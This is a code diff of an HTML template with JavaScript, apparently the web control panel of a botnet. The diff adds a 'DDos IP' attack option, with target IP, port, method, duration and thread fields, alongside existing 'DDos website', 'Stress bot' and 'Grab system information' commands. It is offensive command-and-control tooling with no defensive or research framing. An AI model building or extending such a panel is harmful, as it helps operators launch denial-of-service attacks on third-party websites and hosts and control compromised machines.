@@ -53,6 +53,7 @@
                         <option value="systeminfo">Grab system information</option>
                         <option value="stress">Stress bot</option>
                         <option value="ddos">DDos website</option>
+                        <option value="attack">DDos IP</option>
                     </select>
 
                     <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -87,31 +88,68 @@
                         <label>Tasks</label>
                     </div> 
                 </div>
-                <!-- DDos -->
+                <!-- DDos Website -->
                 <div id="input-needed-ddos" style="display: none;">
                     <div class="commands-input-group"> 
-                        <input type="text" name="ddos-method" id="ddos-method" novalidate>
+                        <input type="text" name="ddos-website-method" id="ddos-website-method" novalidate>
                         <span class="highlight"></span>
                         <span class="bar"></span>
                         <label>Method</label>
                     </div> 
 
                     <div class="commands-input-group"> 
-                        <input type="text" name="ddos-target" id="ddos-target" novalidate>
+                        <input type="text" name="ddos-website-target" id="ddos-website-target" novalidate>
                         <span class="highlight"></span>
                         <span class="bar"></span>
-                        <label>Url</label>
+                        <label>Website</label>
                     </div> 
 
                     <div class="commands-input-group"> 
-                        <input type="text" name="ddos-time" id="ddos-time" novalidate>
+                        <input type="text" name="ddos-website-time" id="ddos-website-time" novalidate>
                         <span class="highlight"></span>
                         <span class="bar"></span>
-                        <label>Time</label>
+                        <label>Attack Time</label>
                     </div> 
 
                     <div class="commands-input-group"> 
-                        <input type="text" name="ddos-thread" id="ddos-thread" novalidate>
+                        <input type="text" name="ddos-website-thread" id="ddos-website-thread" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Threads</label>
+                    </div> 
+                </div>
+                <!-- DDos IP:PORT -->
+                <div id="input-needed-ddos-ip" style="display: none;">
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-ip-method" id="ddos-ip-method" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Method</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-ip-target" id="ddos-ip-target" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>IP</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-ip-port" id="ddos-ip-port" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Port</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-ip-time" id="ddos-ip-time" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Attack Time</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-ip-thread" id="ddos-ip-thread" novalidate>
                         <span class="highlight"></span>
                         <span class="bar"></span>
                         <label>Threads</label>
@@ -130,7 +168,7 @@
     
     <!-- Command Output Box -->
     <div class="place-left" id="parent">
-        <div class="center-output" class="child" >
+        <div class="center-output" >
             <div class="gradient-border"> <textarea class='scroll' id="output" name="output" rows="30" cols="185" style="background-color:rgb(27, 27, 27);" readonly>{{ commandOutput }} </textarea> </div>
         </div>
     </div>
@@ -267,11 +305,18 @@ function commandCheck(command) {
         document.getElementById("input-needed-stress").style.display = "none";
     }
 
-    /* DDos */
+    /* DDos Website */
     if (command.value == "ddos") {
         document.getElementById("input-needed-ddos").style.display = "block";
     } else {
         document.getElementById("input-needed-ddos").style.display = "none";
+    }
+
+    /* DDos IP:PORT */
+    if (command.value == "attack") {
+        document.getElementById("input-needed-ddos-ip").style.display = "block";
+    } else {
+        document.getElementById("input-needed-ddos-ip").style.display = "none";
     }
 }
 </script>
